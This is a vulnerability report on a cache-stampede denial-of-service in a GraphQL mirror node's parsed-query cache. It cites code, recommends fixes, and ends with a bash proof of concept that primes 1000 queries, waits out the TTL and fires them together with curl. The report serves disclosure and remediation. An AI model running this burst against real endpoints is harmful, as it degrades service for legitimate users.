### Title
Cache Stampede via Synchronized TTL Expiry in CachedPreparsedDocumentProvider Enables CPU Spike

### Summary
`CachedPreparsedDocumentProvider` uses a Caffeine `AsyncCache` with `expireAfterWrite=1h,maximumSize=1000`. An unprivileged attacker can prime the cache with up to 1000 unique queries, wait for the 1-hour TTL to expire, then send all 1000 queries simultaneously. Because all entries written in the same priming burst expire at the same time, this triggers 1000 concurrent re-parses with no rate limiting present in the GraphQL module to prevent it.

### Finding Description
**Exact code path:**

- Cache configuration: `CacheProperties.java` line 15 — `private String query = "expireAfterWrite=1h,maximumSize=1000,recordStats";`
- Cache lookup: `CachedPreparsedDocumentProvider.java` lines 24–27 — `cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput))`

**Root cause:** Caffeine's `AsyncCache.get()` deduplicates concurrent loads only *per key*. For 1000 *different* expired keys, 1000 independent `parseAndValidateFunction` invocations are dispatched concurrently. The `expireAfterWrite` policy causes all entries written in the same priming window to expire at the same wall-clock instant, creating a synchronized expiry cliff.

**Exploit flow:**
1. Attacker sends 1000 syntactically distinct but valid GraphQL queries (e.g., varying field aliases or argument names) to fill the cache to its `maximumSize=1000` limit.
2. Attacker waits ~1 hour for all entries to reach their `expireAfterWrite` deadline.
3. Attacker sends all 1000 queries simultaneously in a single coordinated burst.
4. Caffeine finds each key expired (lazy expiry on access), invokes the parse-and-validate loader for each of the 1000 keys concurrently.
5. Each parse runs the full GraphQL lexer, parser, and validator pipeline before the complexity/depth instrumentation can short-circuit anything.

**Why existing checks are insufficient:**
- `MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)` execute *after* parsing and validation — they do not prevent the parse work itself.
- Parser limits (`maxCharacters=10000`, `maxTokens=1000`) bound per-query work but do not limit *concurrency* of parses.
- The `ThrottleConfiguration` / `ThrottleManagerImpl` (bucket4j rate limiter) exists only in the `web3` module; **the `graphql` module has no rate limiting at all** — confirmed by the complete absence of any throttle bean or filter in `graphql/src/main/java/org/hiero/mirror/graphql/`.

### Impact Explanation
The GraphQL node is deployed with a CPU limit of 2 cores (per `charts/hedera-mirror-graphql/values.yaml`). Dispatching 1000 concurrent parse-and-validate tasks on a 2-core JVM will saturate the common fork-join pool, causing a sharp CPU spike well above the 24-hour baseline. This degrades or denies service to legitimate users for the duration of the re-parse burst. The attack is repeatable every hour.

### Likelihood Explanation
No privileges are required. The attacker needs only HTTP access to the GraphQL endpoint. Crafting 1000 syntactically valid but textually distinct queries is trivial (vary a single alias or argument name per query). The 1-hour wait is a low barrier. Sending 1000 concurrent HTTP requests is achievable with standard tooling (`ab`, `wrk`, a simple script). The attack is fully repeatable on a fixed schedule.

### Recommendation
1. **Add rate limiting to the GraphQL module** — apply a per-IP or global request-rate filter (e.g., bucket4j, Spring's `HandlerInterceptor`, or an ingress-level policy) analogous to the one in `web3/ThrottleConfiguration`.
2. **Use `expireAfterAccess` instead of (or in addition to) `expireAfterWrite`** — this staggers expiry based on actual usage patterns, preventing a synchronized expiry cliff.
3. **Limit concurrent parse threads** — wrap `parseAndValidateFunction` in a bounded semaphore so at most N parses run simultaneously regardless of cache state.
4. **Reduce `maximumSize`** — lowering the cache ceiling reduces the maximum blast radius of a single stampede.

### Proof of Concept
```bash
# Step 1: Prime the cache with 1000 unique queries
for i in $(seq 1 1000); do
  curl -s -X POST https://<graphql-host>/graphql \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"{ account(input:{entityId:{shard:0,realm:0,num:$i}}) { alias$i: alias } }\"}" &
done
wait

# Step 2: Wait for TTL expiry
sleep 3601

# Step 3: Burst all 1000 queries simultaneously (triggers 1000 concurrent re-parses)
for i in $(seq 1 1000); do
  curl -s -X POST https://<graphql-host>/graphql \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"{ account(input:{entityId:{shard:0,realm:0,num:$i}}) { alias$i: alias } }\"}" &
done
wait
# Observe CPU spike on the node during the burst window
``` [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** graphql/src/main/java/org/hiero/mirror/graphql/cache/CacheProperties.java (L15-15)
```java
    private String query = "expireAfterWrite=1h,maximumSize=1000,recordStats";
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/cache/CachedPreparsedDocumentProvider.java (L24-27)
```java
    public CompletableFuture<PreparsedDocumentEntry> getDocumentAsync(
            ExecutionInput executionInput, Function<ExecutionInput, PreparsedDocumentEntry> parseAndValidateFunction) {
        return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L42-48)
```java
    GraphQlSourceBuilderCustomizer graphQlCustomizer(PreparsedDocumentProvider provider) {
        var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
        var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
        var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);

        return b -> b.configureGraphQl(
                graphQL -> graphQL.instrumentation(instrumentation).preparsedDocumentProvider(provider));
```
